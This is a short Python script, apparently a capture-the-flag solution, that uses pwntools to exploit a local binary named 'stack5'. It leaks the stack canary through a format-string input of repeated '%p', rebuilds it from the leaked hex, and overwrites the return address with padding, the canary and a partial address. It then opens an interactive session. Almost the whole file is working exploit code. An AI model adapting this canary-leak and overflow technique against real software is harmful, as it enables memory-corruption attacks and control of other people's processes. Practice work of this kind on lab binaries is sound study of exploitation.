import os
import sys
import pwn

def get_canary(bytecode, canary_ofset):
    s = bytecode.decode('utf-8')  # decode bytes to string using utf-8 encoding
    array = s.split(',')
    hex_str = array[canary_ofset]
    hex_str = hex_str[2:]
    tmp = []
    for i in range(0, len(hex_str), 2):
        tmp.append(hex_str[i:i+2])
    hex_list = list(reversed(tmp))
    hex_str = "".join(hex_list)
    return hex_str

padding1 = b'A'*(13*8)
padding2 = b'A'*8
destination = b'\x02\x12\x40'

elf = pwn.context.binary = pwn.ELF("./stack5")

io = pwn.process([elf.path, "%p,"*25])
canary = get_canary(io.recv(timeout=0.1), 20)
canary = bytes.fromhex(canary)

payload = padding1 + canary + padding2 + destination
print(payload)
io.send(payload)
a = io.recv(timeout=1)
io.interactive()
exit()
